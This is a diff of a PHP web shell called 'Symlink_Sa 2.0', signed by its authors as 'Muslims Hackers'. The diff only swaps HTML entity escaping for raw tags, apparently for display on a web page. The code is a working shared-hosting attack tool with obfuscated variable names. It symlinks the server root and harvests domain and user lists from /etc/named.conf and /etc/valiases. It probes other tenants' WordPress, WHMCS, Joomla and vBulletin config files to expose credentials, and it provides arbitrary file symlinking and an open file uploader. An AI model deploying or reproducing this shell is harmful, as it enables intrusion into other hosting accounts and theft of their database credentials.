@@ -27,15 +27,15 @@ This Symlink_Sa 2.0 Shell was coded by Mr.Alsa3ek and Al-Swisre.
 $IIIIIIIIIIIl = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $IIIIIIIIIII1 = explode('/', $IIIIIIIIIIIl);
 $IIIIIIIIIIIl = str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1) - 1], '', $IIIIIIIIIIIl);;
-echo '  &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
+echo '  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 
-&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+<html xmlns="http://www.w3.org/1999/xhtml">
 
-&lt;head&gt;
-&lt;title&gt;Symlink_Sa 2.0&lt;/title&gt;
+<head>
+<title>Symlink_Sa 2.0</title>
 
-&lt;style type="text/css"&gt;
+<style type="text/css">
 
   html,body {
      margin: 0;
@@ -125,13 +125,13 @@ font-family:Tahoma, Arial, sans-serif;
 
 
 
-&lt;/style&gt;
+</style>
 
-&lt;/head&gt;
+</head>
 
-&lt;body&gt;
+<body>
 
-&lt;div class=\'all\'&gt;
+<div class=\'all\'>
 
 
 ';
@@ -148,19 +148,19 @@ $IIIIIIIIII1I = @fopen('sym/.htaccess', 'w');
 fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
 @symlink('/', 'sym/root');
 $IIIIIIIIIlIl = basename('index.php');
-echo '&lt;br /&gt;&lt;div class="hedr"&gt; Symlink Sa 2.0 &lt;br /&gt;&lt;/div&gt;';
-echo '&lt;br /&gt;&lt;div class="hedr"&gt;-:[ User & Domains & Symlink ]:-&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;';
-echo '&lt;div class="cont"&gt;
+echo '<br /><div class="hedr"> Symlink Sa 2.0 <br /></div>';
+echo '<br /><div class="hedr">-:[ User & Domains & Symlink ]:-<br /><br /></div>';
+echo '<div class="cont">
 
-[&lt;a href="?"&gt; Home &lt;/a&gt;]
+[<a href="?"> Home </a>]
 
-[&lt;a href="?sws=sym"&gt; User & Domains & Symlink &lt;/a&gt;]
+[<a href="?sws=sym"> User & Domains & Symlink </a>]
 
-[&lt;a href="?sws=sec"&gt; Domains & Script &lt;/a&gt;]
+[<a href="?sws=sec"> Domains & Script </a>]
 
-[ &lt;a href="?sws=file"&gt; Symlink File &lt;/a&gt;]&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+[ <a href="?sws=file"> Symlink File </a>]<br /><br /><br />
 
-&lt;/div&gt;';
+</div>';
 if (isset($_REQUEST['sws'])) {
     switch ($_REQUEST['sws']) {
         case 'sec':
@@ -168,13 +168,13 @@ if (isset($_REQUEST['sws'])) {
             if (!$IIIIIIIIIllI) {
                 die(" can't read /etc/named.conf");
             } else {
-                echo "&lt;div class='tmp'&gt;
-&lt;table align='center' width='40%'&gt;&lt;td&gt; Domains &lt;/td&gt;&lt;td&gt; Script &lt;/td&gt;";
+                echo "<div class='tmp'>
+<table align='center' width='40%'><td> Domains </td><td> Script </td>";
                 foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
                     if (eregi('zone', $IIIIIIIIIll1)) {
                         preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
                         flush();
-                        if (strlen(trim($IIIIIIIIIl11[1][0])) &gt; 2) {
+                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
                             $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
                             $IIIIIIIII1l1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/wp-config.php';
                             $IIIIIIIII11I = get_headers($IIIIIIIII1l1);
@@ -215,31 +215,31 @@ if (isset($_REQUEST['sws'])) {
                             $IIIIIIII1Ill = strpos($IIIIIIIII11l, '200');
                             $IIIIIIII1I1I = '&nbsp;';
                             if (strpos($IIIIIIIII11l, '200') == true) {
-                                $IIIIIIII1I1I = "&lt;a href='" . $IIIIIIIII1l1 . "' target='_blank'&gt;Wordpress&lt;/a&gt;";
+                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII1l1 . "' target='_blank'>Wordpress</a>";
                             } elseif (strpos($IIIIIIIIlIIl, '200') == true) {
-                                $IIIIIIII1I1I = "&lt;a href='" . $IIIIIIIII111 . "' target='_blank'&gt;Wordpress&lt;/a&gt;";
+                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII111 . "' target='_blank'>Wordpress</a>";
                             } elseif (strpos($IIIIIIIIlIll, '200') == true and strpos($IIIIIIII1III, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIl11l . "' target='_blank'&gt;WHMCS&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl11l . "' target='_blank'>WHMCS</a>";
                             } elseif (strpos($IIIIIIIIl1lI, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIl1I1 . "' target='_blank'&gt;WHMCS&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1I1 . "' target='_blank'>WHMCS</a>";
                             } elseif (strpos($IIIIIIIIl11I, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIl1ll . "' target='_blank'&gt;WHMCS&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1ll . "' target='_blank'>WHMCS</a>";
                             } elseif (strpos($IIIIIIIIlIll, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIlII1 . "' target='_blank'&gt;Joomla&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlII1 . "' target='_blank'>Joomla</a>";
                             } elseif (strpos($IIIIIIIIlI1l, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIlIl1 . "' target='_blank'&gt;Joomla&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlIl1 . "' target='_blank'>Joomla</a>";
                             } elseif (strpos($IIIIIIIIllIl, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIlI11 . "' target='_blank'&gt;vBulletin&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlI11 . "' target='_blank'>vBulletin</a>";
                             } elseif (strpos($IIIIIIIIllll, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIllI1 . "' target='_blank'&gt;vBulletin&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIllI1 . "' target='_blank'>vBulletin</a>";
                             } elseif (strpos($IIIIIIIIll1l, '200') == true) {
-                                $IIIIIIII1I1I = " &lt;a href='" . $IIIIIIIIlll1 . "' target='_blank'&gt;vBulletin&lt;/a&gt;";
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlll1 . "' target='_blank'>vBulletin</a>";
                             } else {
                                 continue;
                             }
                             $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
-                            echo '&lt;tr&gt;&lt;td&gt;&lt;a href=http://www.' . $IIIIIIIIIl11[1][0] . '/&gt;' . $IIIIIIIIIl11[1][0] . '&lt;/a&gt;&lt;/td&gt;
-&lt;td&gt;' . $IIIIIIII1I1I . '&lt;/td&gt;&lt;/tr&gt;';
+                            echo '<tr><td><a href=http://www.' . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIIIIl11[1][0] . '</a></td>
+<td>' . $IIIIIIII1I1I . '</td></tr>';
                             flush();
                         }
                     }
@@ -251,12 +251,12 @@ if (isset($_REQUEST['sws'])) {
             if (!$IIIIIIIIIllI) {
                 die(" can't read /etc/named.conf");
             } else {
-                echo "&lt;div class='tmp'&gt;&lt;table align='center' width='40%'&gt;&lt;td&gt;Domains&lt;/td&gt;&lt;td&gt;Users&lt;/td&gt;&lt;td&gt;symlink &lt;/td&gt;";
+                echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
                 foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
                     if (eregi('zone', $IIIIIIIIIll1)) {
                         preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
                         flush();
-                        if (strlen(trim($IIIIIIIIIl11[1][0])) &gt; 2) {
+                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
                             $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
                             $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
                             @symlink('/', 'sym/root');
@@ -264,31 +264,31 @@ if (isset($_REQUEST['sws'])) {
                             $IIIIIIII1I11 = '\.ir';
                             $IIIIIIII1lII = '\.il';
                             if (eregi("$IIIIIIII1I11", $IIIIIIIIIl11[1][0]) or eregi("$IIIIIIII1lII", $IIIIIIIIIl11[1][0])) {
-                                $IIIIIIII1I1l = "&lt;div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '&gt;" . $IIIIIIIIIl11[1][0] . '&lt;/div&gt;';
+                                $IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $IIIIIIIIIl11[1][0] . '</div>';
                             }
                             echo "
-&lt;tr&gt;
+<tr>
 
-&lt;td&gt;
-&lt;div class='dom'&gt;&lt;a target='_blank' href=http://www." . $IIIIIIIIIl11[1][0] . '/&gt;' . $IIIIIIII1I1l . ' &lt;/a&gt; &lt;/div&gt;
-&lt;/td&gt;
+<td>
+<div class='dom'><a target='_blank' href=http://www." . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIII1I1l . ' </a> </div>
+</td>
 
 
-&lt;td&gt;
+<td>
 ' . $IIIIIIIII1I1['name'] . "
-&lt;/td&gt;
+</td>
 
 
 
 
 
 
-&lt;td&gt;
-&lt;a href='sym/root/home/" . $IIIIIIIII1I1['name'] . "/public_html' target='_blank'&gt;symlink &lt;/a&gt;
-&lt;/td&gt;
+<td>
+<a href='sym/root/home/" . $IIIIIIIII1I1['name'] . "/public_html' target='_blank'>symlink </a>
+</td>
 
 
-&lt;/tr&gt;&lt;/div&gt; ";
+</tr></div> ";
                             flush();
                         }
                     }
@@ -299,45 +299,45 @@ if (isset($_REQUEST['sws'])) {
             echo '
 The file path to symlink
 
-&lt;br /&gt;&lt;br /&gt;
-&lt;form method="post"&gt;
-&lt;input type="text" name="file" value="/home/user/public_html/file.name" size="60"/&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;input type="text" name="symfile" value="file.name_sym ( Ex. :: 1.txt )" size="60"/&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;input type="submit" value="symlink" name="symlink" /&gt; &lt;br /&gt;&lt;br /&gt;
+<br /><br />
+<form method="post">
+<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
+<input type="text" name="symfile" value="file.name_sym ( Ex. :: 1.txt )" size="60"/><br /><br />
+<input type="submit" value="symlink" name="symlink" /> <br /><br />
 
 
 
-&lt;/form&gt;
+</form>
 ';
             $IIIIIIII1lIl = $_POST['file'];
             $symfile = $_POST['symfile'];
             $symlink = $_POST['symlink'];
             if ($symlink) {
                 @symlink("$IIIIIIII1lIl", "sym/$symfile");
-                echo '&lt;br /&gt;&lt;a target="_blank" href="sym/' . $symfile . '" &gt;' . $symfile . '&lt;/a&gt;';
+                echo '<br /><a target="_blank" href="sym/' . $symfile . '" >' . $symfile . '</a>';
             }
         break;
         default:
             header("Location: $IIIIIIIIIlIl");
     }
 } else {
-    echo '&lt;form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"&gt;';
-    echo '&lt;input type="file" name="file" value="Choose file" size="60" &gt;&lt;input name="_upl" type="submit" id="_upl" value="Upload"&gt;&lt;/form&gt;';
+    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+    echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
     if ($_POST['_upl'] == 'Upload') {
         if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-            echo '&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Uploaded successful !!&lt;br&gt;&lt;br&gt;';
+            echo '<br /><br /><b>Uploaded successful !!<br><br>';
         } else {
-            echo '&lt;br /&gt;&lt;br /&gt;Not uploaded !!&lt;br&gt;&lt;br&gt;';
+            echo '<br /><br />Not uploaded !!<br><br>';
         }
     }
     echo '
-&lt;br /&gt;&lt;br /&gt;&lt;div class="fot"&gt;Cod3d by Mr.Alsa3ek and Al-Swisre
-&lt;br /&gt;&lt;br /&gt;
-Muslims Hackers&lt;/div&gt; ';
+<br /><br /><div class="fot">Cod3d by Mr.Alsa3ek and Al-Swisre
+<br /><br />
+Muslims Hackers</div> ';
 };
 echo '
-&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+</div>
+</body>
+</html>
 ';
 {% endhighlight %}
